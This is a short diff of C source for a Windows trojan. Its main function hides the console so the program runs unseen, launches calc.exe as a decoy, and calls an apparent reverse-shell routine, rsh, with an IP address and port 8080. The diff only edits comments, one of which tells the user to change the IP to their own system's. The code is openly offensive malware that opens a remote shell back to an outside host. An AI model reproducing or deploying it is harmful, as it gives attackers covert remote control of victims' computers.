@@ -63,9 +63,9 @@ void rsh(char* server, int Port)
 
 int main() {
     FreeConsole(); // clear console || allow trojan to run in the background
-        char h[] = "192.168.225.197";
+        char h[] = "192.168.225.197"; // change the ip as per your own system's
         int p = 8080;
-        system("start C:\\WINDOWS\\System32\\calc.exe"); // fire decoy
+        system("start C:\\WINDOWS\\System32\\calc.exe"); // firing decoy process.
         rsh(h, p);
         return 0;
 }
